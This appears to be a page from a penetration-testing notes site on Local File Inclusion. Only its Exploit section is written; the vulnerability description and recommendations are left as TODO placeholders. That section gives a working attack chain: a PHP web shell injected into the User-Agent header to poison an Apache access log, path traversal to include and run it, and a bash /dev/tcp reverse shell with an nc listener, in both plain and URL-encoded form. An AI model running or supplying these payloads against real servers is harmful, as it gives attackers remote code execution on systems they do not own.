---
layout: default
title: Local File Inclusion
parent: Web Applications
nav_order: 3
permalink: /webapps/lfi/
---

# Local File Inclusion
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

TODO: Describe the vulnerability here.

## Prerequisites

* TODO: List prerequisites here.

## Exploit

First, identify a file that can be read from the web application using [Directory Transversal](/webapps/transversal/) attack. You must be able to write into the file in a way or another. For example, try to target log files, since they could contain HTTP headers you can modify.

Let’s assume you can read `../../../../../../../../../var/log/apache2/access.log`. You notice it contains `User-Agent` header you can modify with Burp:

```bash
GET /whatever/index.php
Host $domain
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
...
```

The request will be logged in `access.log` file, including the PHP snippet you added in the `User-Agent` header. Then, you can request the file with Burp so the code will be executed on the server:

```bash
# Don't forget to encode the command passed in parameter
GET /whatever/index.php?page=../../../../var/log/apache2/access.log?cmd=echo%20hello%20world!
Host $domain
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
...
```

If it works, you can try to execute a reverse shell like so:

```bash
# Command to execute on the target.
bash -c "bash -i >& /dev/tcp/$lhost/$lport 0>&1"

# Same command, but encoded.
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lhost%2F$lport%200%3E%261%22

# On Kali, open your listener.
nc -nlvp $lport

# With Burp.
GET /whatever/index.php?page=../../../../var/log/apache2/access.log?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lhost%2F$lport%200%3E%261%22
Host $domain
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
...
```

## Recommendations

- [ ] TODO: List recommendations here.